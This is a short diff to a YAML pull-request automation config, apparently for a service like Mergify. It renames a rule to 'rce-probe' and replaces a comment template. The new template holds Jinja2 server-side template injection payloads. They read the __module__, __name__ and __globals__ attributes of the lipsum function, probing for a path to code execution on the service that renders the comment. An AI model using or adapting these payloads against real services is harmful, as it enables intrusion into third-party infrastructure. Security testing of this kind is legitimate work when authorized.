@@ -1,13 +1,10 @@
 pull_request_rules:
-  - name: escalation-final
+  - name: rce-probe
     conditions:
       - label=ssti-test
     actions:
       comment:
         message: |
-          FULL_REPR={{lipsum|string}}
-          LEN={{lipsum|string|length}}
-          SLICE_10_50={{(lipsum|string)[10:50]}}
-          SLICE_0_10={{(lipsum|string)[0:10]}}
-          CYCLER_STR={{cycler(1)|string}}
-          NESTED={%- for i in range(5) -%}{%- for j in range(5) -%}{{i}}{{j}},{%- endfor -%}{%- endfor -%}
+          MODULE={{[lipsum]|map(attribute="__module__")|list}}
+          NAME={{[lipsum]|map(attribute="__name__")|list}}
+          GLOBALS_TYPE={{[lipsum]|map(attribute="__globals__")|list|string|truncate(300)}}
